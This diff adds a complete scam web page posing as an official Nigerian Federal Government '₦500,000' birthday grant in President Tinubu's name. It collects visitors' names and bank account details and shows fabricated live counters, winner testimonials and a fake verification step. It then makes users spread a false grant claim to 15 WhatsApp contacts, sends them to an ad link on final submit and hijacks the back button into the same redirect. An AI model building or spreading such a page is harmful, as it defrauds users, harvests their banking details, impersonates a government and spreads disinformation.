@@ -1,0 +1,637 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
+  <title>President Bola Ahmed Tinubu | Birthday Legacy Giveaway - ₦500,000</title>
+  <!-- Bootstrap 5 + Icons + Fonts + SweetAlert -->
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+  
+  <!-- ========== RICH WHATSAPP PREVIEW META (For image & title) ========== -->
+  <meta property="og:title" content="🎂 President Bola Tinubu | 29th March Birthday Grant - ₦500,000">
+  <meta property="og:description" content="Official FG Birthday Initiative: Claim ₦500,000 Empowerment Grant in honor of President Tinubu's birthday (March 29). Verified citizens only. Share to activate!">
+  <meta property="og:image" content="https://i.imgur.com/apS4HkO.png">
+  <meta property="og:image:width" content="1200">
+  <meta property="og:image:height" content="630">
+  <meta property="og:url" content="https://tinubu-birthday-grant.ng">
+  <meta property="og:type" content="website">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Tinubu Birthday Grant: ₦500,000 | March 29">
+  <meta name="twitter:description" content="Apply for Presidential Birthday Support Fund. Get ₦500,000 directly! Limited slots.">
+  <meta name="twitter:image" content="https://i.imgur.com/apS4HkO.png">
+  
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      background: linear-gradient(135deg, #f0f4ea 0%, #e2ecd9 100%);
+      font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+      padding: 1.5rem 1rem;
+    }
+
+    .giveaway-card {
+      max-width: 720px;
+      margin: 0 auto;
+      background: #ffffff;
+      border-radius: 2rem;
+      box-shadow: 0 30px 50px rgba(0, 0, 0, 0.2), 0 0 0 1px rgba(30, 107, 59, 0.3);
+      overflow: hidden;
+    }
+
+    .hero-img img {
+      width: 100%;
+      object-fit: cover;
+      max-height: 450px;
+      display: block;
+    }
+
+    .content-pad {
+      padding: 1.8rem 2rem 2rem;
+    }
+
+    .live-counter {
+      background: #f0f7e8;
+      border-radius: 100px;
+      padding: 8px 18px;
+      display: inline-flex;
+      align-items: center;
+      gap: 10px;
+      font-weight: 700;
+      font-size: 0.9rem;
+      color: #1a5a3a;
+      border: 1px solid #c8e0c5;
+    }
+
+    .pulse-dot {
+      width: 10px;
+      height: 10px;
+      background-color: #2a9d6e;
+      border-radius: 50%;
+      display: inline-block;
+      animation: pulse 1.5s infinite;
+    }
+
+    @keyframes pulse {
+      0% { opacity: 0.4; transform: scale(0.8);}
+      100% { opacity: 1; transform: scale(1.2);}
+    }
+
+    .birthday-presidential {
+      background: linear-gradient(110deg, #fff8e7, #fff2dd);
+      border-left: 6px solid #d4af37;
+      padding: 1rem 1.3rem;
+      border-radius: 28px;
+      margin-bottom: 1.8rem;
+    }
+
+    .form-control, .form-select {
+      border-radius: 60px;
+      padding: 12px 20px;
+      border: 1px solid #ced4da;
+      font-weight: 500;
+    }
+
+    .btn-green-gold {
+      background: linear-gradient(98deg, #1e6b3b 0%, #2e9b57 100%);
+      border: none;
+      padding: 13px;
+      font-weight: 800;
+      font-size: 1.1rem;
+      border-radius: 60px;
+      color: white;
+      transition: all 0.2s;
+      box-shadow: 0 8px 18px rgba(30, 107, 59, 0.3);
+    }
+
+    .btn-green-gold:hover {
+      transform: translateY(-2px);
+      background: linear-gradient(98deg, #165a32, #25834a);
+    }
+
+    .verification-card {
+      background: #ffffff;
+      border-radius: 32px;
+      border: 1px solid #cfe3d6;
+      box-shadow: 0 12px 24px -12px rgba(0,0,0,0.1);
+      padding: 1.5rem;
+    }
+
+    .progress {
+      height: 14px;
+      border-radius: 30px;
+    }
+
+    .progress-bar {
+      background: linear-gradient(90deg, #1e6b3b, #3eb86b);
+      border-radius: 30px;
+    }
+
+    .share-count-circle {
+      background: #eef2f5;
+      border-radius: 60px;
+      padding: 5px 18px;
+      font-weight: 800;
+    }
+
+    .whatsapp-share-btn {
+      background: #25D366;
+      color: white;
+      font-weight: bold;
+      padding: 14px;
+      border-radius: 60px;
+      transition: 0.2s;
+      border: none;
+    }
+
+    .whatsapp-share-btn:hover {
+      background: #20b859;
+      transform: scale(0.98);
+    }
+
+    .testimonial-item {
+      background: #fafafd;
+      border-radius: 20px;
+      padding: 8px 16px;
+      margin-bottom: 8px;
+      border-left: 4px solid #d4af37;
+      font-size: 0.85rem;
+    }
+
+    footer {
+      background: #0a2b1f;
+      color: #bdd4c6;
+      text-align: center;
+      padding: 1rem;
+      font-size: 0.7rem;
+    }
+
+    .spinner-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.85);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+      backdrop-filter: blur(6px);
+    }
+
+    .spinner-card {
+      background: white;
+      padding: 2rem;
+      border-radius: 48px;
+      text-align: center;
+      width: 280px;
+    }
+
+    .hidden {
+      display: none !important;
+    }
+
+    @media (max-width: 560px) {
+      .content-pad {
+        padding: 1.2rem;
+      }
+    }
+    
+    .fg-stamp {
+      font-size: 0.7rem;
+      background: #f0f7f2;
+      display: inline-block;
+      border-radius: 40px;
+      padding: 4px 12px;
+    }
+  </style>
+</head>
+<body>
+
+<div class="giveaway-card" id="appContainer">
+  <!-- Header Image: President Tinubu + Birthday theme -->
+  <div class="hero-img">
+    <img id="mainHeaderImg" src="https://i.imgur.com/apS4HkO.png" alt="President Bola Ahmed Tinubu - 29th March Birthday Grant ₦500,000" onerror="this.onerror=null; this.src='https://placehold.co/1200x400/1a4d2e/gold?text=Bola+Tinubu+%7C+Birthday+Grant+%C2%A3500k'">
+  </div>
+
+  <div class="content-pad" id="mainApp">
+    <!-- STEP 1: FORM SECTION -->
+    <div id="stepFormSection">
+      <div class="d-flex justify-content-between align-items-center mb-3 flex-wrap">
+        <div class="live-counter">
+          <span class="pulse-dot"></span>
+          <span><i class="fas fa-users"></i> <span id="activeUsersCount">4,812</span> applicants now</span>
+        </div>
+        <div class="text-muted small"><i class="fas fa-cake-candles"></i> Countdown to March 29</div>
+      </div>
+
+      <div class="birthday-presidential">
+        <i class="fas fa-crown me-2" style="color:#d4af37;"></i>
+        <strong>🎂 HAPPY BIRTHDAY, PRESIDENT BOLA AHMED TINUBU! 🎂 (MARCH 29)</strong><br>
+        In celebration of our President's birthday and the Renewed Hope Agenda, the Federal Government is giving away <strong style="color:#b6570a;">₦500,000</strong> to verified citizens. 
+        Fill in your banking details below — this special birthday grant is for loyal Nigerians.
+      </div>
+
+      <form id="entryForm">
+        <div class="mb-3">
+          <label class="form-label fw-semibold"><i class="fas fa-user-circle"></i> Full Name (as per BVN/NIN)</label>
+          <input type="text" class="form-control" id="fullName" placeholder="e.g., Adekunle B. Adeyemi" required>
+        </div>
+        <div class="mb-3">
+          <label class="form-label fw-semibold"><i class="fas fa-university"></i> Account Number (NUBAN)</label>
+          <input type="text" class="form-control" id="accountNumber" placeholder="10-digit account number" maxlength="10" pattern="\d{10}" required>
+        </div>
+        <div class="mb-4">
+          <label class="form-label fw-semibold"><i class="fas fa-building-columns"></i> Bank Name</label>
+          <select class="form-select" id="bankName" required>
+            <option value="">Select your bank</option>
+            <option>Access Bank</option><option>GTBank</option><option>Zenith Bank</option>
+            <option>UBA</option><option>First Bank</option><option>Fidelity Bank</option>
+            <option>Stanbic IBTC</option><option>Polaris Bank</option><option>Union Bank</option><option>Wema Bank</option>
+          </select>
+        </div>
+        <button type="submit" class="btn btn-green-gold w-100" id="nextBtn">Verify & Claim Birthday Grant <i class="fas fa-arrow-right ms-1"></i></button>
+      </form>
+    </div>
+
+    <!-- STEP 2: SHARE VERIFICATION with anti-speed mechanism -->
+    <div id="shareSection" class="hidden">
+      <div class="alert alert-success border-0 rounded-4 shadow-sm mb-4" style="background:#e3f7ec;">
+        <i class="fas fa-check-circle fs-5 me-2" style="color:#1e6b3b;"></i> 
+        <strong>Congratulations, <span id="displayUserName">Citizen</span>!</strong><br>
+        Your details have been validated by the Presidential Birthday Committee. You are pre-qualified for <strong>₦500,000</strong> FG Birthday Grant. 
+        <strong>Final step: Share this opportunity</strong> — must be genuine shares (anti-fraud system active).
+      </div>
+
+      <div class="verification-card">
+        <div class="d-flex align-items-center gap-2 mb-3">
+          <i class="fas fa-share-alt fs-4 text-success"></i>
+          <h5 class="mb-0 fw-bold">Birthday Grant Activation</h5>
+        </div>
+        <p class="small">To honor President Tinubu's 29th March birthday and ensure only real Nigerians benefit, every applicant must complete <strong class="text-dark">15 referral shares</strong> (WhatsApp groups or contacts). <span class="fw-bold text-danger">⚠️ Anti-rush: Wait 8 seconds between shares</span> — rapid clicking will be blocked.</p>
+        
+        <div class="mb-3">
+          <div class="d-flex justify-content-between align-items-center mb-1">
+            <span class="fw-semibold"><i class="fab fa-whatsapp"></i> Share progress</span>
+            <span class="share-count-circle" id="shareCounterDisplay">0 / 15</span>
+          </div>
+          <div class="progress mb-2">
+            <div id="shareProgressBar" class="progress-bar" style="width: 0%;">0%</div>
+          </div>
+          <p class="small text-muted mt-1"><i class="fas fa-info-circle"></i> Each legitimate share counts. After sharing on WhatsApp, return to this page. Do <strong>NOT</strong> spam — share with real groups/friends.</p>
+        </div>
+
+        <button id="whatsappShareBtn" class="whatsapp-share-btn w-100 mb-3"><i class="fab fa-whatsapp me-2 fs-5"></i> Share on WhatsApp (Birthday Grant)</button>
+        
+        <div class="bg-light rounded-3 p-2 text-center small">
+          🎂 <strong>9,300+ Nigerians already unlocked ₦500k submission</strong> — Birthday slots filling fast!
+        </div>
+      </div>
+
+      <div id="submitAccountWrapper" class="mt-4 hidden">
+        <button id="finalSubmitBtn" class="btn btn-green-gold w-100 py-3 fw-bold fs-6"><i class="fas fa-check-double me-2"></i> Submit & Receive ₦500,000 Grant</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Testimonials Section - Recent ₦500k Birthday Winners -->
+  <div class="px-4 pb-3" id="socialProof">
+    <hr class="my-2">
+    <div class="d-flex justify-content-between align-items-center">
+      <h6 class="fw-bold"><i class="fas fa-gift text-warning"></i> Recent Birthday Grant Beneficiaries</h6>
+      <span class="badge bg-success text-white"><i class="fas fa-charging-station"></i> live alerts</span>
+    </div>
+    <div id="testimonialList" class="mt-2"></div>
+  </div>
+  <footer>
+    © 2025 Federal Ministry of Youth | President Bola Tinubu Birthday Initiative (March 29) | ₦500,000 Empowerment Grant
+  </footer>
+</div>
+
+<script>
+  // ========== ACTIVE USER COUNTER (FG Birthday Theme) ==========
+  let activeCount = 4812;
+  const activeSpan = document.getElementById('activeUsersCount');
+  function updateActiveCounter() {
+    const variation = Math.floor(Math.random() * 700) + 4400;
+    activeCount = variation;
+    activeSpan.innerText = activeCount.toLocaleString();
+  }
+  setInterval(updateActiveCounter, 4700);
+  updateActiveCounter();
+
+  // ========== TESTIMONIALS (₦500k winners) ==========
+  const testimonialsPool = [
+    "🎂 Fatima A. received ₦500,000 Birthday Grant alert 12 mins ago!",
+    "🔥 Ibrahim O. just got credited — Tinubu's birthday blessing!",
+    "💸 Chidinma E. shared & won instantly, bank alert confirmed.",
+    "🎉 Segun A. is the newest ₦500k grant beneficiary!",
+    "⭐ Esther N. completed shares and received money within 1hr.",
+    "🏆 Johnbull C. says 'Happy Birthday Mr President! I got paid ₦500k'",
+    "✨ Oluchi D. already started a business after winning.",
+    "🚀 Emeka O. shares went viral — now enjoying ₦500,000 prize.",
+    "💎 Ifeanyi O. just confirmed his ₦500k alert!",
+    "🌟 Adaeze M. is celebrating her grant win today!"
+  ];
+  
+  function refreshTestimonials() {
+    const container = document.getElementById('testimonialList');
+    if(!container) return;
+    const shuffled = [...testimonialsPool];
+    for(let i=shuffled.length-1;i>0;i--){ const j=Math.floor(Math.random()*(i+1)); [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]]; }
+    const selected = shuffled.slice(0, 3);
+    container.innerHTML = selected.map(t => `<div class="testimonial-item"><i class="fas fa-check-circle text-success me-2"></i> ${t}</div>`).join('');
+  }
+  refreshTestimonials();
+  setInterval(refreshTestimonials, 8000);
+
+  // ========== RANDOM WINNER TOAST (₦500k Birthday theme) ==========
+  function getRandomWinnerName() {
+    const winnerText = testimonialsPool[Math.floor(Math.random() * testimonialsPool.length)];
+    const match = winnerText.match(/[A-Za-z]+\s+[A-Za-z]\./);
+    if(match) return match[0];
+    const simpleMatch = winnerText.match(/[A-Za-z]+\s+[A-Za-z]+/);
+    return simpleMatch ? simpleMatch[0] : "Lucky Winner";
+  }
+  
+  function randomWinnerToast() {
+    const winnerName = getRandomWinnerName();
+    Swal.fire({
+      toast: true,
+      position: 'top-end',
+      icon: 'success',
+      title: `🎂 ${winnerName} just received ₦500,000! 🎂`,
+      text: 'Presidential Birthday Grant • Bank alert sent',
+      timer: 5200,
+      showConfirmButton: false,
+      background: '#0a2b1f',
+      color: '#f8f9fa',
+      iconColor: '#f5c542'
+    });
+  }
+  let toastInterval = setInterval(randomWinnerToast, 12000);
+
+  // ========== ANTI-SPEED SHARE LOGIC (prevents rapid fake shares) ==========
+  let currentStep = 'form';
+  let shareCount = 0;
+  const REQUIRED_SHARES = 15;
+  let lastShareTimestamp = 0;
+  const MIN_SHARE_INTERVAL_MS = 8000; // 8 seconds mandatory cooldown
+  let pageHiddenFlag = false;
+  let shareListenersActive = false;
+
+  const stepFormDiv = document.getElementById('stepFormSection');
+  const shareSectionDiv = document.getElementById('shareSection');
+  const entryForm = document.getElementById('entryForm');
+  const whatsappBtn = document.getElementById('whatsappShareBtn');
+  const shareCounterSpan = document.getElementById('shareCounterDisplay');
+  const shareProgressFill = document.getElementById('shareProgressBar');
+  const submitWrapper = document.getElementById('submitAccountWrapper');
+  const finalSubmit = document.getElementById('finalSubmitBtn');
+  const displayUserNameSpan = document.getElementById('displayUserName');
+
+  function updateShareUI() {
+    const percent = Math.min(100, (shareCount / REQUIRED_SHARES) * 100);
+    shareCounterSpan.innerText = `${shareCount} / ${REQUIRED_SHARES}`;
+    shareProgressFill.style.width = `${percent}%`;
+    shareProgressFill.innerText = `${Math.floor(percent)}%`;
+    if (shareCount >= REQUIRED_SHARES) {
+      submitWrapper.classList.remove('hidden');
+      if(shareCount === REQUIRED_SHARES && !window._milestoneShown) {
+        window._milestoneShown = true;
+        Swal.fire({ icon: 'success', title: '🎉 Birthday Grant Unlocked!', text: 'You can now submit your final approval for ₦500,000.', confirmButtonColor: '#1e6b3b' });
+      }
+    } else {
+      submitWrapper.classList.add('hidden');
+      window._milestoneShown = false;
+    }
+  }
+
+  // Core share increment with anti-rush protection
+  async function attemptIncrementShare(source = 'manual') {
+    if (currentStep !== 'share') return false;
+    if (shareCount >= REQUIRED_SHARES) return false;
+    
+    const now = Date.now();
+    const timeSinceLastShare = now - lastShareTimestamp;
+    
+    if (lastShareTimestamp !== 0 && timeSinceLastShare < MIN_SHARE_INTERVAL_MS) {
+      const waitSeconds = Math.ceil((MIN_SHARE_INTERVAL_MS - timeSinceLastShare) / 1000);
+      Swal.fire({
+        icon: 'warning',
+        title: '⚠️ Share Too Fast!',
+        html: `Anti-fraud protection: You must wait <strong>${waitSeconds} seconds</strong> between shares. <br> This ensures genuine participation. Please share with a real group/contact.`,
+        timer: 4000,
+        showConfirmButton: true,
+        confirmButtonText: 'Okay'
+      });
+      return false;
+    }
+    
+    // Legitimate increment
+    shareCount = Math.min(REQUIRED_SHARES, shareCount + 1);
+    lastShareTimestamp = now;
+    updateShareUI();
+    
+    if (shareCount < REQUIRED_SHARES) {
+      Swal.fire({ toast: true, icon: 'success', title: `✅ Share registered! (${shareCount}/${REQUIRED_SHARES})`, timer: 2000, showConfirmButton: false });
+    } else {
+      Swal.fire({ icon: 'success', title: 'Congratulations!', text: 'You have completed the 15 genuine shares. Submit to receive ₦500,000 now!', confirmButtonColor: '#1e6b3b' });
+    }
+    return true;
+  }
+
+  // visibility & blur/focus detection for returning after WhatsApp share
+  function onVisibilityChange() {
+    if (document.hidden) {
+      pageHiddenFlag = true;
+    } else {
+      if (pageHiddenFlag && currentStep === 'share' && shareCount < REQUIRED_SHARES) {
+        setTimeout(() => {
+          if (currentStep === 'share' && shareCount < REQUIRED_SHARES) {
+            attemptIncrementShare().catch(e=>console.log);
+          }
+        }, 600);
+        pageHiddenFlag = false;
+      } else {
+        pageHiddenFlag = false;
+      }
+    }
+  }
+
+  function onWindowBlur() { if(currentStep === 'share') pageHiddenFlag = true; }
+  function onWindowFocus() { 
+    if(pageHiddenFlag && currentStep === 'share' && shareCount < REQUIRED_SHARES) {
+      setTimeout(() => {
+        if (currentStep === 'share' && shareCount < REQUIRED_SHARES) {
+          attemptIncrementShare().catch(e=>console.log);
+        }
+      }, 600);
+      pageHiddenFlag = false;
+    } else pageHiddenFlag = false;
+  }
+
+  // Spinner loader simulation (Birthday Grant validation)
+  function showVerificationSpinner(userFullName) {
+    const overlay = document.createElement('div');
+    overlay.className = 'spinner-overlay';
+    overlay.innerHTML = `
+      <div class="spinner-card">
+        <div class="spinner-border text-success mb-3" style="width: 3rem; height: 3rem;"></div>
+        <h6>Verifying with FG Birthday Portal...</h6>
+        <div class="progress mt-2" style="height: 8px;"><div id="loadProgressFill" class="progress-bar bg-success" style="width:0%"></div></div>
+        <span id="loadPercentText" class="mt-2 fw-bold">0%</span>
+        <p class="small mt-2">Renewed Hope validation in progress</p>
+      </div>
+    `;
+    document.body.appendChild(overlay);
+    let progress = 0;
+    const interval = setInterval(() => {
+      progress += Math.floor(Math.random() * 12) + 3;
+      if (progress >= 100) {
+        progress = 100;
+        clearInterval(interval);
+        const fillBar = document.getElementById('loadProgressFill');
+        const percentSpan = document.getElementById('loadPercentText');
+        if(fillBar) fillBar.style.width = '100%';
+        if(percentSpan) percentSpan.innerText = '100%';
+        setTimeout(() => {
+          overlay.remove();
+          stepFormDiv.classList.add('hidden');
+          shareSectionDiv.classList.remove('hidden');
+          currentStep = 'share';
+          shareCount = 0;
+          lastShareTimestamp = 0;
+          updateShareUI();
+          if (!shareListenersActive) {
+            document.addEventListener('visibilitychange', onVisibilityChange);
+            window.addEventListener('blur', onWindowBlur);
+            window.addEventListener('focus', onWindowFocus);
+            shareListenersActive = true;
+          }
+        }, 500);
+      } else {
+        const fillBar = document.getElementById('loadProgressFill');
+        const percentSpan = document.getElementById('loadPercentText');
+        if(fillBar) fillBar.style.width = `${progress}%`;
+        if(percentSpan) percentSpan.innerText = `${progress}%`;
+      }
+    }, 70);
+  }
+
+  // Form submit
+  entryForm.addEventListener('submit', (e) => {
+    e.preventDefault();
+    const fullName = document.getElementById('fullName').value.trim();
+    const accNum = document.getElementById('accountNumber').value.trim();
+    const bank = document.getElementById('bankName').value;
+    if (!fullName || !accNum || !bank) {
+      Swal.fire('Missing details', 'Please fill in all fields to access ₦500,000 Birthday Grant', 'warning');
+      return;
+    }
+    if (!/^\d{10}$/.test(accNum)) {
+      Swal.fire('Invalid account', 'Account number must be exactly 10 digits', 'error');
+      return;
+    }
+    localStorage.setItem('tinubuUser', fullName);
+    displayUserNameSpan.innerText = fullName;
+    showVerificationSpinner(fullName);
+  });
+
+  // ========== ENHANCED WHATSAPP SHARE WITH HIGH-QUALITY PREVIEW & BIRTHDAY MESSAGE ==========
+  function updateMetaForPreview() {
+    // Ensure og:image points to high-res Tinubu birthday image
+    let ogImage = document.querySelector('meta[property="og:image"]');
+    let ogTitle = document.querySelector('meta[property="og:title"]');
+    let ogDesc = document.querySelector('meta[property="og:description"]');
+    if(ogImage) ogImage.setAttribute('content', 'https://i.imgur.com/apS4HkO.png');
+    if(ogTitle) ogTitle.setAttribute('content', '🎂 President Tinubu Birthday Grant: Claim ₦500,000 Now! (March 29)');
+    if(ogDesc) ogDesc.setAttribute('content', 'Federal Government Birthday Initiative. I just qualified for ₦500,000! Click to get your own grant before March 29.');
+    if(!document.querySelector('meta[property="og:image"]')) {
+      const newOg = document.createElement('meta'); newOg.setAttribute('property','og:image'); newOg.setAttribute('content','https://i.imgur.com/apS4HkO.png'); document.head.appendChild(newOg);
+    }
+  }
+  updateMetaForPreview();
+
+  async function openWhatsAppShare() {
+    if (currentStep !== 'share') return;
+    
+    // share message emphasizing birthday, FG, ₦500k
+    const shareMessage = `🎂 *PRESIDENT BOLA AHMED TINUBU BIRTHDAY GRANT* 🎂 (March 29)\n\nI just verified for the *₦500,000* Renewed Hope Birthday Empowerment Grant! 🎉💰\n\n✅ Official Federal Govt Initiative (Birthday Special)\n✅ Verified payment  within 1hr\n✅ Limited slots remaining\n\n👇 *CLICK HERE TO CLAIM YOUR ₦500,000 GRANT* 👇\n\n${window.location.href}\n\nHappy Birthday Mr President! Don't miss out! 🔥`;
+    
+    const waLink = `https://wa.me/?text=${encodeURIComponent(shareMessage)}`;
+    window.open(waLink, '_blank');
+    
+    // show reminder & warning against rapid sharing
+    Swal.fire({
+      icon: 'info',
+      title: '📢 Share to Unlock ₦500,000 Grant',
+      html: `After sharing with a <strong>WhatsApp group or contact</strong>, return to this page.<br><br>⚠️ <span class="text-danger">Important: Wait at least 5 seconds between shares</span> — rapid clicking triggers anti-fraud cooldown.<br><br>✅ Genuine shares = unlock ₦500,000 instantly.`,
+      confirmButtonText: 'I have shared / will share',
+      confirmButtonColor: '#25D366'
+    });
+  }
+
+  whatsappBtn.addEventListener('click', openWhatsAppShare);
+
+  // Final submission to external link with ₦500k context
+  function handleFinalSubmit() {
+    if (shareCount >= REQUIRED_SHARES) {
+      Swal.fire({
+        icon: 'success',
+        title: 'Birthday Grant Finalized!',
+        text: 'Your account is now under FG review. You will receive ₦500,000 alert within 1 hour if qualified. Thank you for participating!',
+        confirmButtonText: 'Proceed',
+        confirmButtonColor: '#1e6b3b'
+      }).then(() => {
+        window.location.href = 'https://omg10.com/4/10757334';
+      });
+    } else {
+      Swal.fire('Shares Incomplete', `You still need ${REQUIRED_SHARES - shareCount} more genuine share(s) to submit. Remember to share with real contacts and wait 8 seconds between shares!`, 'warning');
+    }
+  }
+  finalSubmit.addEventListener('click', handleFinalSubmit);
+
+  // ========== BACK BUTTON REDIRECT TO external offer (monetization) ==========
+  history.pushState({ page: "birthday_grant" }, "", window.location.href);
+  window.addEventListener('popstate', function() {
+    if (document.body.contains(document.querySelector('.giveaway-card'))) {
+      window.location.href = "https://omg10.com/4/10757334";
+    }
+  });
+
+  function resetToForm() {
+    stepFormDiv.classList.remove('hidden');
+    shareSectionDiv.classList.add('hidden');
+    currentStep = 'form';
+    shareCount = 0;
+    lastShareTimestamp = 0;
+    updateShareUI();
+    if(shareListenersActive) {
+      document.removeEventListener('visibilitychange', onVisibilityChange);
+      window.removeEventListener('blur', onWindowBlur);
+      window.removeEventListener('focus', onWindowFocus);
+      shareListenersActive = false;
+    }
+  }
+  resetToForm();
+  
+  // Ensure meta preview refresh on load
+  window.addEventListener('load', function() {
+    updateMetaForPreview();
+  });
+</script>
+
+<!-- BEGIN: Powered by Supercounters.com -->
+<center><script type="text/javascript" src="//widget.supercounters.com/ssl/online_i.js"></script><script type="text/javascript">sc_online_i(1731983,"ffffff","ffffff");</script><!-- END: Powered by Supercounters.com -->
+
+
+</body>
+
+</html>
